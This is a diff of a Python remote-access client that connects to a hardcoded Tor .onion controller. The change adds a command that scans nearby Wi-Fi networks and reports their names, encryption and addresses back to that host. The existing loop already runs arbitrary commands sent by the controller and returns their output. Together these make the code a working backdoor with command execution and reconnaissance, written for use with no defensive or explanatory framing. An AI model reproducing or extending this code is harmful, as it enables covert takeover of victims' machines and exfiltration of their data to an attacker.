@@ -1,6 +1,7 @@
 import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
+from wifi import Cell, Scheme
 
 host = '3pnzzdpq7aj6s6b6.onion'
 cType = "client000-crypto"
@@ -15,6 +16,16 @@ except:
 def RecvData():
     temp = ssl_sock.read()
     return temp
+
+def ScanWIFI(card):
+    try:
+        wifiCell = Cell.all(card)
+    except:
+        wifiCell = Cell.all('wlan0')
+        SendData("Something went wrong... using wlan0")
+    for i in range(0,len(wifiCell)):
+        SendData(str(wifiCell[i]) + " is encrypted: "+ str(wifiCell[i].encrypted) + "= " + str(wifiCell[i].encryption_type) + " | address: " +str(wifiCell[i].address))
+    SendData("ScanWIFI-finished")
 
 def RecvData():
     temp = ssl_sock.read()
@@ -94,6 +105,8 @@ while 1:
     elif inText == "terminate":
         ssl_sock.close()
         sys.exit(0)
+    elif inText.startswith("ScanWIFI"):
+        ScanWIFI(inText.split(':')[1])
     elif inText.startswith("exec"):
         outEXEC = EXEC(inText.split(":")[1])
         SendData(outEXEC)
